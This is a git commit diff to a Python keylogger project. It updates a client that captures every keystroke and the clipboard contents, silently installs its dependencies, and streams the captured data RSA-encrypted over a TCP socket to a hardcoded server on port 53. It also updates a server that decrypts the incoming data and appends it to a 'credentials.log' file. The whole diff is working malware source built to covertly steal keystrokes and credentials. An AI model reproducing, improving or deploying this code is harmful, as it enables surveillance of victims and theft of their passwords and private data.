51f739192a9149a9271dbcb85bc7aa2eff1a1884
Debang5hu <roydebangshu22@gmail.com>
2024-06-10 01:39:39 +0530

    updated

--- keylogger.py
+++ keylogger.py
@@ -3,55 +3,72 @@
 # _*_ coding: utf-8 _*_
 #tested on Linux (Linux kali 6.5.0-kali2-amd64)
 
-#to do:
-#logging keystrokes of virtual keyboard
+# to do:
+# logging keystrokes of virtual keyboard
+# data encryption
+
+# fixed:
+# thousands of connection to 1 server (Now the data are sent within a single socket connection)
+
 
 try:
     from os import system
     import threading, socket
     from pynput import keyboard
     from pandas import read_clipboard
+    import rsa
 except:
     #two dependencies pynput and pandas ['-q' for quite mode]
     system('pip install -q pynput')
     system('pip install -q pandas')
+    system('pip install -q rsa')
 
 # <-- Initializing global values -->
 
-#replace the IP with your server's IP 
-
-#LAN (it establishes a TCP connection for sending data)
+# replace the IP with your server's IP 
+# LAN (it establishes a TCP connection for sending data)
 SERVER_ADDRESS = ("192.168.29.54", "53")
 
 
 #keystroke record
 class keylogger:
-    def Keylogging(self):
 
+    # init
+    def __init__(self):
+        #connecting to the server
+        self.server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+        self.server.connect((SERVER_ADDRESS[0],int(SERVER_ADDRESS[1])))
+
+        # receive and deserialize the RSA public key from the server
+        self.serialized_publickey = self.server.recv(4096).decode()
+        self.publickey = rsa.PublicKey.load_pkcs1(self.serialized_publickey)
+    
+
+    def Keylogging(self):
         def on_key_press(key):
             try:
-                #connecting to the server
-                server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-                server.connect((SERVER_ADDRESS[0],int(SERVER_ADDRESS[1])))
-                try:
-                    #clipboard:
-                    data = str(read_clipboard().columns)
-                    data = data.lstrip('Index([')
-                    data = data.split("], dtype='object'")
-                    data = data[0]
-                    server.send((f'Clipboard data: {data}\n').encode())
-                except:
-                    server.send(('Failed to Fetch clipboard data\n').encode())
+                # clipboard data processing:
+                data = str(read_clipboard().columns)
+                data = data.lstrip('Index([')
+                data = data.split("], dtype='object'")
+                data = data[0]
 
-                #keystroke:
-                server.send(str(f'Keystoke: {key}').encode())
-                server.close()
+                # sending the encrypted data to the server
+                self.server.send(rsa.encrypt((f'Clipboard data: {data}').encode(), self.publickey))
+                self.server.send(rsa.encrypt((str(f'{key}')).encode(), self.publickey))
+
             except:
                 pass
+
 
         # Create listener objects
         with keyboard.Listener(on_press=on_key_press) as listener:
             listener.join()
+
+
+    # destruct
+    def __del__(self):
+        self.server.close()
 
 
 if __name__=='__main__':
--- server.py
+++ server.py
@@ -5,12 +5,31 @@
 #port-forwarding
 
 #increased the buffer size
+# added cryptography
+
+# todo
+# manages different connections separately
+
+# Bug
+# if fails to decrypt some data
 
 import socket
+import rsa
 
 FILENAME = 'credentials.log'
 
+
+def generatekey():
+    publickey,privatekey = rsa.newkeys(512)  # 4096 bits
+    serialized_publickey = publickey.save_pkcs1()  # to send the keys over a network in a standard format we use Serialization
+    return serialized_publickey,privatekey
+        
+
 def main():
+
+    # init keys
+    serialized_publickey,privatekey = generatekey()
+
     #tcp connection
     server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 
@@ -22,28 +41,42 @@ def main():
     print('[+] Server is up!')
 
     try:
-        while True:  
-            conn, addr = server.accept()     
-            print(f'Connection from {addr[0]} on port {addr[1]}')
-        
-            #decoding the data which is send by the client
-            data = conn.recv(4096).decode() 
+        while True:
+            conn, addr = server.accept()
+            print(f'[+] Connection from {addr[0]} on port {addr[1]}')
 
-            if not data:
-                continue
+            # Sending the public key
+            conn.send(serialized_publickey)
 
-            #Creating a file at server
-            with open(FILENAME,'a+') as fh:
-                while data:
+            try:
+                while True:
+                    # Receiving encrypted data from the client
+                    data = conn.recv(4096)
+                    
                     if not data:
+                        print(f'[+] Connection Closed from {addr[0]} on port {addr[1]}')
                         break
-                    else:
-                        fh.write(data)
+                        
+
+                    try:
+                        data = rsa.decrypt(data, privatekey).decode('utf-8')
+                    except rsa.DecryptionError:
+                        print(f'[+] Decryption failed')
+                        continue
+                    
+
+                    print(data)  # Print received data
+
+                    # Logging the received data to a file
+                    with open(FILENAME, 'a+') as fh:
+                        fh.write(str(data))
                         fh.write('\n')
-                        data = conn.recv(1024).decode()
-        
-            print('[+] Received Successfully!')
-            conn.close() #closing the connection
+
+                print('[+] Received Successfully!')
+                conn.close()  # Closing the connection
+            
+            except NameError as e:
+                print(e)
 
     except KeyboardInterrupt:
         pass
